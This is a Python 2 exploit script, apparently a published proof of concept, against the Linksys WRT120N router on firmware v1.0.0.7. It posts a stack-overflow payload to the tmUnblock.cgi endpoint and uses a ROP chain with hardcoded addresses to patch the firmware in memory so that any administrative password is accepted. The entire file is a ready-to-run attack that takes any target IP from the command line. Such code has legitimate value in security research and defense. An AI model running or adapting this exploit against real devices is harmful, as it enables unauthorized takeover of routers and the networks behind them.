#!/usr/bin/env python
#
# WRT120N v1.0.0.7 stack overflow, ROP to arbitrary 4-byte overwrite that 
# patches the firmware's code in memory to accept any administrative password.
#
# Craig Heffner
# 2014-02-14

import sys
import urllib2

try:
    target = sys.argv[1]
except IndexError:
    print "Usage: %s <target ip>" % sys.argv[0]
    sys.exit(1)

url = target + '/cgi-bin/tmUnblock.cgi'
if '://' not in url:
    url = 'http://' + url

post_data = "period=0&TM_Block_MAC=00:01:02:03:04:05&TM_Block_URL="
post_data += "B" * 246                  # Filler
post_data += "D" * 4                    # $s0, don't care
post_data += "\x80\x23\xC3\x10"         # $ra
post_data += "C" * 0x28                 # Stack filler
post_data += "\x80\x1C\x99\x98"         # ROP 1 $s0, address to write to
post_data += "\x02\x10\x10\x23"         # ROP 1 $s1, data to write (subu $v0, $s0, $s0)
post_data += "\x80\x23\xC3\x04"         # ROP 1 $ra (address of ROP 2)
post_data += "E" * 4                    # Stack filler

for i in range(0, 4):
    post_data += "F" * 4                # ROP 2 $s0, don't care
    post_data += "G" * 4                # ROP 2 $s1, don't care
    post_data += "\x80\x23\xC3\x10"     # ROP 2 $ra (just for moving $sp up by 0x10 each iteration)
    post_data += "H" * (4-(3*(i/3)))    # Stack filler; needs to be 4 bytes except for the
                                        # last stack frame where it needs to be 1 byte (to
                                        # account for the trailing "\n\n" and terminating
                                        # NULL byte)

try:
    req = urllib2.Request(url, post_data)
    res = urllib2.urlopen(req)
except urllib2.HTTPError as e:
    if e.code == 500:
        print "OK"
    else:
        print "Received unexpected server response:", str(e)
except KeyboardInterrupt:
    pass
